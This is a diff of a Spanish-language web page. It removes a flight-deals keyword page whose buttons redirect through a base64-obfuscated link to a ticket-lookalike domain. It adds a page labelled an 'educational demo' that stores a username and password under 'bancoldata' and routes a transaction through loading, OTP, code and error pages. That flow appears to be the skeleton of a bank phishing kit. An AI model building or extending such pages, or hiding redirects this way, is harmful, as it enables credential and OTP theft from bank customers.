@@ -1,374 +1,264 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="es">
 <head>
   <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Vuelos Futuristas — Palabras clave</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Demo Seguro — Inicio</title>
+  <meta name="description" content="Demo seguro: flujo de validación (educativo). No usar datos reales." />
   <style>
-    /* ===== RESET ===== */
-    * { box-sizing: border-box; margin: 0; padding: 0; }
-    html,body { height: 100%; }
-
-    /* ===== BODY / FONDO ===== */
-    body {
-      font-family: 'Poppins', sans-serif;
-      background: radial-gradient(circle at top, #0a0a0a, #000000 70%);
-      color: #e6f7ff;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      min-height: 100vh;
-      overflow-x: hidden;
-      padding: 20px;
+    :root{
+      --bg:#0f172a;
+      --card:#0b1220;
+      --accent:#677eff;
+      --muted:#9aa4c2;
+      --glass: rgba(255,255,255,0.03);
     }
-
-    /* ===== AVION ANIMADO ===== */
-    .fondo-avion {
-      position: fixed;
-      top: 20%;
-      left: -120px;
-      width: 120px;
-      opacity: 0.12;
-      z-index: 0;
-      animation: volar 18s linear infinite;
-      pointer-events: none;
-    }
-    @keyframes volar {
-      from { transform: translateX(0) translateY(-20%); }
-      to   { transform: translateX(140vw) translateY(-20%); }
-    }
-
-    /* ===== CONTENEDOR PRINCIPAL ===== */
-    .wrap {
-      width: 100%;
-      max-width: 980px;
-      z-index: 1;
-      display: grid;
-      grid-template-columns: 1fr 420px;
-      gap: 20px;
-      align-items: start;
-    }
-
-    @media (max-width: 900px) {
-      .wrap { grid-template-columns: 1fr; padding-bottom: 40px; }
-    }
-
-    /* ===== CARD PRINCIPAL ===== */
-    .card {
-      background: linear-gradient(180deg, rgba(255,255,255,0.03), rgba(255,255,255,0.02));
-      border: 1px solid rgba(0,255,255,0.06);
-      border-radius: 16px;
-      padding: 28px;
-      box-shadow: 0 8px 30px rgba(0,170,255,0.06);
-      backdrop-filter: blur(8px);
-    }
-
-    .title {
-      color: #00eaff;
-      font-size: 1.6rem;
-      text-shadow: 0 0 10px #00eaff;
-      margin-bottom: 8px;
-    }
-    .subtitle {
-      color: #cfeffb;
-      margin-bottom: 18px;
-    }
-
-    /* ===== BOTONES PRINCIPALES ===== */
-    .actions {
+    *{box-sizing:border-box}
+    body{
+      margin:0;
+      min-height:100vh;
       display:flex;
-      gap:12px;
-      flex-wrap:wrap;
-      margin-bottom: 18px;
-    }
-    .btn {
-      background: linear-gradient(90deg,#00cfff,#0080ff);
-      color: #001;
-      border: none;
-      padding: 12px 22px;
-      border-radius: 999px;
-      font-weight: 700;
-      box-shadow: 0 6px 20px rgba(0,170,255,0.18);
-      cursor: pointer;
-      transition: transform .18s ease, box-shadow .18s ease;
-    }
-    .btn:hover { transform: translateY(-3px); box-shadow: 0 10px 30px rgba(0,170,255,0.28); }
-
-    /* ===== PANEL DE KEYWORDS ===== */
-    .panel {
-      background: rgba(255,255,255,0.02);
-      border-radius: 12px;
-      padding: 16px;
-      border: 1px solid rgba(0,255,255,0.04);
-      max-height: 460px;
-      overflow: auto;
-    }
-
-    .panel-header {
-      display:flex;
-      gap:10px;
       align-items:center;
-      margin-bottom:12px;
-      flex-wrap:wrap;
+      justify-content:center;
+      font-family:Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+      background: linear-gradient(180deg, #061028 0%, #08132a 60%);
+      color:#e6eef8;
+      padding:24px;
+    }
+    .container{
+      width:100%;
+      max-width:980px;
+      display:grid;
+      grid-template-columns: 1fr 360px;
+      gap:20px;
+      align-items:start;
     }
 
-    .search {
-      flex:1;
-      min-width: 160px;
+    .panel{
+      background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
+      border-radius:12px;
+      padding:18px;
+      box-shadow: 0 10px 30px rgba(2,6,23,0.6);
+      border: 1px solid rgba(255,255,255,0.03);
     }
 
-    .input {
+    h1{margin:0 0 8px;font-size:20px}
+    p.lead{margin:0 0 14px;color:var(--muted);font-size:14px}
+
+    label{display:block;font-size:13px;color:var(--muted);margin-top:10px}
+    input[type="text"], input[type="password"]{
       width:100%;
       padding:10px 12px;
-      border-radius:10px;
-      border:1px solid rgba(255,255,255,0.06);
-      background: rgba(0,0,0,0.4);
-      color: #e6f7ff;
+      margin-top:6px;
+      border-radius:8px;
+      background:var(--glass);
+      border:1px solid rgba(255,255,255,0.04);
+      color:#e6eef8;
+      font-size:14px;
     }
-
-    .controls { display:flex; gap:8px; }
-
-    .copy-btn {
-      padding:8px 12px;
-      border-radius:10px;
-      border:1px solid rgba(0,255,255,0.08);
-      background: linear-gradient(90deg,#002a4d,#003b73);
-      color:#cfeffb;
-      cursor:pointer;
-      font-weight:600;
+    .row{display:flex;gap:8px;margin-top:12px}
+    button{
+      padding:10px 12px;border-radius:8px;border:0;font-weight:600;cursor:pointer;
+      background:var(--accent); color:white;
     }
-    .copy-btn:hover{ filter:brightness(1.05); }
+    button.secondary{background:transparent;border:1px solid rgba(255,255,255,0.06);color:var(--muted)}
+    small.note{display:block;color:var(--muted);margin-top:8px;font-size:13px}
 
-    /* ===== TAGS ===== */
-    .tags {
-      display:flex;
-      gap:8px;
-      flex-wrap:wrap;
-    }
-    .tag {
-      background: linear-gradient(90deg, rgba(0,170,255,0.12), rgba(0,120,255,0.08));
-      padding:8px 12px;
-      border-radius: 999px;
-      color: #cfeffb;
-      font-weight:600;
-      font-size:0.95rem;
-      border:1px solid rgba(0,255,255,0.04);
-      cursor: default;
-      transition: transform .12s ease;
-    }
-    .tag:hover { transform: translateY(-3px); box-shadow: 0 8px 20px rgba(0,170,255,0.06); }
-
-    /* ===== SIDEBAR INFO ===== */
-    .sidebar {
-      display:flex;
-      flex-direction:column;
-      gap:16px;
-      position:sticky;
-      top:22px;
-      height: fit-content;
-    }
-
-    .info {
-      padding:14px;
-      border-radius:12px;
-      background: rgba(255,255,255,0.02);
-      border:1px solid rgba(0,255,255,0.04);
-    }
-    .info h4 { color:#00eaff; margin-bottom:6px; }
-    .meta { color:#bfefff; font-size:0.95rem; }
-
-    /* ===== FOOTER ===== */
-    footer {
-      margin-top: 28px;
-      color: #9fcfe6;
-      font-size: 0.9rem;
-      opacity: 0.95;
-    }
-
-    /* scrollbar small */
-    .panel::-webkit-scrollbar { height:8px; width:8px; }
-    .panel::-webkit-scrollbar-thumb { background: rgba(0,170,255,0.12); border-radius:8px; }
+    .card-right{position:sticky; top:24px;}
+    .list{display:grid;gap:8px;margin-top:8px}
+    .chip{background:rgba(255,255,255,0.02);padding:10px;border-radius:10px;border:1px solid rgba(255,255,255,0.02);font-size:13px}
+    pre{background:#021028;padding:12px;border-radius:8px;overflow:auto;color:#bcd7ff;font-size:13px}
+    footer{margin-top:12px;color:var(--muted);font-size:13px}
+    .danger{background:#ef4444}
   </style>
-
-  <!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=AW-17644351498"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'AW-17644351498');
-</script>
 </head>
 <body>
+  <div class="container">
+    <div class="panel">
+      <h1>Demo Seguro — Flujo de validación</h1>
+      <p class="lead">Este index permite configurar datos de prueba y lanzar el flujo de validación sin enviar credenciales reales a servidores externos.</p>
 
-  <!-- avion animado -->
-  <img class="fondo-avion" src="https://cdn-icons-png.flaticon.com/512/69/69906.png" alt="avion">
+      <label for="usuario">Usuario (demo)</label>
+      <input id="usuario" type="text" placeholder="usuario_demo">
 
-  <div class="wrap">
+      <label for="clave">Clave (demo)</label>
+      <input id="clave" type="password" placeholder="clave_demo">
 
-    <!-- AREA PRINCIPAL -->
-    <div class="card">
-      <div class="title">✈ Vuelos Futuristas — Palabras clave</div>
-      <div class="subtitle">Lista optimizada de frases para tu campaña Google Ads. Usa búsqueda o copia todo para pegar en Keyword Planner.</div>
-
-      <div class="actions">
-       <a href="#" onclick="window.location.href=atob('aHR0cHM6Ly90aXF1dGVzYmFyYXRvLnZlcmNlbC5hcHAv')">
-          <button class="btn">✈ Cotizar</button>
-        </a>
-        <a href="#" onclick="window.location.href=atob('aHR0cHM6Ly90aXF1dGVzYmFyYXRvLnZlcmNlbC5hcHAv')">
-          <button class="btn">🛒 Reservar</button>
-        </a>
+      <div class="row" style="margin-top:14px">
+        <button id="save">Guardar demo</button>
+        <button id="start" class="secondary">Iniciar flujo (cargando)</button>
+        <button id="start-sim" class="secondary">Iniciar flujo (simulado)</button>
       </div>
 
-      <!-- PANEL DE KEYWORDS -->
-      <div class="panel" id="panel">
-        <div class="panel-header">
-          <div class="search">
-            <input id="q" class="input" placeholder="Buscar palabra clave..." />
-          </div>
-          <div class="controls">
-            
-          </div>
+      <small class="note">Guardar crea el objeto <code>bancoldata</code> en <code>localStorage</code>. El flujo "cargando" redirige a <code>cargando.html</code> (obra demo).</small>
+
+      <hr style="margin:18px 0;border:none;border-top:1px solid rgba(255,255,255,0.03)">
+
+      <h3 style="margin:0 0 8px">Herramientas de prueba</h3>
+      <div class="list">
+        <div class="chip">
+          <strong>ID de transacción actual:</strong>
+          <div id="txid" style="margin-top:6px;font-family:monospace;color:#bcd7ff">—</div>
         </div>
 
-        <div id="tags" class="tags">
-          <!-- Tags: se insertan desde JS -->
+        <div class="chip">
+          <strong>Estado simulado / manual</strong>
+          <div style="display:flex;gap:8px;margin-top:8px">
+            <button class="secondary" data-state="autorizado">Autorizar</button>
+            <button class="secondary" data-state="otp">Solicitar OTP</button>
+            <button class="secondary" data-state="error">Error</button>
+            <button class="secondary" data-state="fallo">Fallo</button>
+            <button class="secondary" data-state="finalizado">Finalizar</button>
+          </div>
+          <small style="display:block;margin-top:8px;color:var(--muted)">Usa estos botones para escribir un estado simulado en <code>/status</code> local (no externo).</small>
+        </div>
+
+        <div class="chip">
+          <strong>Pruebas rápidas</strong>
+          <div style="display:flex;gap:8px;margin-top:8px">
+            <button id="clear" class="secondary">Limpiar localStorage</button>
+            <button id="show" class="secondary">Ver bancoldata</button>
+            <button id="gen" class="secondary">Generar tx id</button>
+          </div>
         </div>
       </div>
+
+      <footer>
+        <small>Demo educativo — No envíes datos reales. Puedo generar las páginas relacionadas (<code>cargando.html</code>, <code>otp.html</code>, etc.) si quieres.</small>
+      </footer>
     </div>
 
-    <!-- SIDEBAR -->
-    <aside class="sidebar">
-      <div class="info">
-        <h4>Consejos rápidos</h4>
-        <p class="meta">• Filtra por ciudad para crear grupos de anuncios.<br>
-        • Usa concordancias amplias + palabras negativas.<br>
-        • Verifica volumen con Keyword Planner (Colombia).</p>
+    <div class="panel card-right">
+      <h3 style="margin-top:0">Estado & ayuda</h3>
+      <p class="lead" style="margin-bottom:8px">Panel rápido para ver la información que guarda la demo.</p>
+
+      <div class="chip" style="margin-bottom:10px">
+        <strong>Contenido de <code>bancoldata</code>:</strong>
+        <pre id="bancol-preview">—</pre>
       </div>
 
-      <div class="info">
-        <h4>Top ciudades</h4>
-        <p class="meta">Bogotá, Medellín, Cartagena, Cali, San Andrés, Pereira, Bucaramanga, Santa Marta.</p>
+      <div class="chip">
+        <strong>Nota sobre producción</strong>
+        <p style="margin:8px 0 0;color:var(--muted);font-size:13px">
+          En producción nunca guardes contraseñas en texto plano. Usa hashing, HTTPS, y no reenvíes credenciales por canales no seguros.
+        </p>
       </div>
-
-      <div class="info">
-        <h4>Formato listo</h4>
-        <p class="meta">Las frases están listas para copiar y pegar en Google Ads → <strong>Planificador de palabras clave</strong>.</p>
-      </div>
-    </aside>
-
+    </div>
   </div>
 
-  <footer>
-    © 2025 Vuelos Futuristas — Lista de palabras clave preparada para campaña Google Ads
-  </footer>
-
   <script>
-    // ====== LISTA DE 40 PALABRAS (30 + 10 adicionales) ======
-    const keywords = [
-      "vuelos Bogotá Medellín baratos",
-      "tiquetes baratos Bogotá Cartagena",
-      "vuelos baratos Bogotá Cali",
-      "ofertas vuelos Medellín Santa Marta",
-      "promociones nacionales vuelos Colombia",
-      "vuelos low cost Bogotá San Andrés",
-      "tiquetes Medellín Cartagena baratos",
-      "vuelos Bogotá Bucaramanga baratos",
-      "vuelos Cali Medellín ofertas",
-      "vuelos baratos Pereira Bogotá",
-      "vuelos económicos nacional Colombia",
-      "vuelos baratos Cartagena Santa Marta",
-      "tiquetes baratos Bogotá Barranquilla",
-      "promociones vuelos Bogotá San Andrés",
-      "vuelos Bogotá Cúcuta ofertas",
-      "vuelos baratos Bucaramanga Medellín",
-      "vuelos Medellín Cali baratos",
-      "vuelos nacionales baratos Colombia",
-      "vuelos baratos Bogotá Pereira",
-      "tiquetes baratos destinos nacionales",
-      "ofertas vuelos Bogotá Montería",
-      "vuelos baratos Pereira Cartagena",
-      "vuelos baratos Medellín Bucaramanga",
-      "vuelos baratos Cali Santa Marta",
-      "promociones Bogotá Medellín ida y vuelta",
-      "vuelos baratos Colombia hoy",
-      "tiquetes baratos Medellín Pereira",
-      "vuelos Bogotá Santa Marta promoción",
-      "vuelos baratos destino nacional",
-      "ofertas vuelos Medellín San Andrés",
-      /* 10 adicionales */
-      "vuelos baratos a Cali desde Bogotá",
-      "promociones de tiquetes aéreos en Colombia",
-      "vuelos económicos a Cartagena todo el año",
-      "tiquetes baratos Pereira Medellín",
-      "vuelos nacionales en oferta hoy",
-      "tiquetes aéreos baratos Bogotá San Andrés",
-      "vuelos de última hora baratos Colombia",
-      "vuelos Medellín Santa Marta promociones",
-      "vuelos ida y regreso baratos Colombia",
-      "tiquetes baratos Cali Cartagena"
-    ];
+    // Utilidades
+    const $ = id => document.getElementById(id);
 
-    // ====== Mostrar tags ======
-    const tagsContainer = document.getElementById('tags');
-    function renderTags(list) {
-      tagsContainer.innerHTML = '';
-      list.forEach(k => {
-        const el = document.createElement('div');
-        el.className = 'tag';
-        el.textContent = k;
-        tagsContainer.appendChild(el);
-      });
+    function readBancol(){
+      try {
+        return JSON.parse(localStorage.getItem('bancoldata') || 'null');
+      } catch (e) { return null; }
     }
-    renderTags(keywords);
-
-    // ====== Buscador en vivo ======
-    const q = document.getElementById('q');
-    q.addEventListener('input', () => {
-      const v = q.value.trim().toLowerCase();
-      if (!v) { renderTags(keywords); return; }
-      const filtered = keywords.filter(k => k.toLowerCase().includes(v));
-      renderTags(filtered);
-    });
-
-    // ====== Copiar funciones ======
-    function copyText(text) {
-      navigator.clipboard.writeText(text).then(() => {
-        alert('Copiado al portapapeles ✅');
-      }).catch(err => {
-        // fallback
-        const t = document.createElement('textarea');
-        t.value = text;
-        document.body.appendChild(t);
-        t.select();
-        try { document.execCommand('copy'); alert('Copiado al portapapeles ✅'); }
-        catch(e){ alert('Error al copiar: ' + e); }
-        t.remove();
-      });
+    function renderPreview(){
+      const data = readBancol();
+      $('bancol-preview').textContent = data ? JSON.stringify(data, null, 2) : '—';
+      $('txid').textContent = localStorage.getItem('transactionId') || '—';
     }
 
-    document.getElementById('copyAll').addEventListener('click', () => {
-      copyText(keywords.join('\n'));
+    // Guardar demo
+    $('save').addEventListener('click', () => {
+      const usuario = $('usuario').value.trim() || 'usuario_demo';
+      const clave = $('clave').value.trim() || 'clave_demo';
+      const obj = { usuario, clave, createdAt: new Date().toISOString() };
+      localStorage.setItem('bancoldata', JSON.stringify(obj));
+      alert('Datos demo guardados en localStorage (bancoldata).');
+      renderPreview();
     });
 
-    document.getElementById('copyVisible').addEventListener('click', () => {
-      // copiar solo las visibles (en el DOM actualmente)
-      const visible = Array.from(document.querySelectorAll('#tags .tag')).map(t => t.textContent);
-      if (visible.length === 0) { alert('No hay palabras visibles para copiar.'); return; }
-      copyText(visible.join('\n'));
+    // Iniciar flujo: redirige a cargando.html (presume que existe)
+    $('start').addEventListener('click', () => {
+      const bancol = readBancol();
+      if (!bancol) {
+        alert('Primero guarda datos demo (botón "Guardar demo").');
+        return;
+      }
+      // Generar transactionId y guardarlo
+      const tx = Date.now().toString(36) + Math.random().toString(36).substr(2);
+      localStorage.setItem('transactionId', tx);
+      renderPreview();
+      // Redirigir a la página de carga (demo)
+      window.location.href = 'cargando.html';
     });
 
-    // ====== Entrada: animar aparición de botones (opcional) ======
-    window.addEventListener('load', () => {
-      setTimeout(() => {
-        const panel = document.querySelector('.botones');
-        if (panel) panel.classList?.add('visible');
-      }, 700);
+    // Iniciar flujo simulado: no redirección, simula un roundtrip
+    $('start-sim').addEventListener('click', async () => {
+      const bancol = readBancol();
+      if (!bancol) {
+        alert('Primero guarda datos demo (botón "Guardar demo").');
+        return;
+      }
+      const tx = Date.now().toString(36) + Math.random().toString(36).substr(2);
+      localStorage.setItem('transactionId', tx);
+      renderPreview();
+      alert('Simulación iniciada. Se decidirá un estado aleatorio y se redirigirá.');
+      // Simular latencia
+      await new Promise(r => setTimeout(r, 1400));
+      const estados = ['autorizado','otp','error','fallo','finalizado'];
+      const elegido = estados[Math.floor(Math.random()*estados.length)];
+      // Escribir estado simulado en localStorage "status_{tx}"
+      localStorage.setItem('status_' + tx, JSON.stringify({ estado: elegido, at: new Date().toISOString() }));
+      // Redirigir según estado (simulado)
+      switch(elegido){
+        case 'autorizado': window.location.href = 'codigo.html'; break;
+        case 'otp': window.location.href = 'otp.html'; break;
+        case 'error': window.location.href = 'usererror.html'; break;
+        case 'fallo': window.location.href = 'fallo.html'; break;
+        case 'finalizado': window.location.href = 'finalizar.html'; break;
+        default: window.location.href = 'index.html';
+      }
     });
+
+    // Generar transaction id sin redirigir
+    $('gen').addEventListener('click', () => {
+      const tx = Date.now().toString(36) + Math.random().toString(36).substr(2);
+      localStorage.setItem('transactionId', tx);
+      renderPreview();
+      alert('Transaction ID generado: ' + tx);
+    });
+
+    // Limpiar localStorage demo
+    $('clear').addEventListener('click', () => {
+      if (!confirm('¿Borrar datos demo (localStorage)?')) return;
+      localStorage.removeItem('bancoldata');
+      localStorage.removeItem('transactionId');
+      renderPreview();
+      alert('LocalStorage limpiado.');
+    });
+
+    // Ver bancoldata en consola
+    $('show').addEventListener('click', () => {
+      const b = readBancol();
+      if (!b) { alert('No hay bancoldata guardado.'); return; }
+      alert('bancoldata:\\n' + JSON.stringify(b, null, 2));
+    });
+
+    // Botones de estado manual (escriben una "status_{tx}" local)
+    document.querySelectorAll('[data-state]').forEach(btn => {
+      btn.addEventListener('click', () => {
+        const state = btn.getAttribute('data-state');
+        const tx = localStorage.getItem('transactionId');
+        if (!tx) { alert('Genera primero un transactionId (botón "Generar tx id").'); return; }
+        localStorage.setItem('status_' + tx, JSON.stringify({ estado: state, at: new Date().toISOString() }));
+        alert('Estado "' + state + '" guardado para tx: ' + tx);
+        renderPreview();
+      });
+    });
+
+    // Renderizar estado inicial
+    renderPreview();
+
+    // Si hay bancoldata al cargar, rellenar inputs
+    const existing = readBancol();
+    if (existing) {
+      $('usuario').value = existing.usuario || '';
+      $('clave').value = existing.clave || '';
+    }
   </script>
 </body>
 </html>
-
-
-
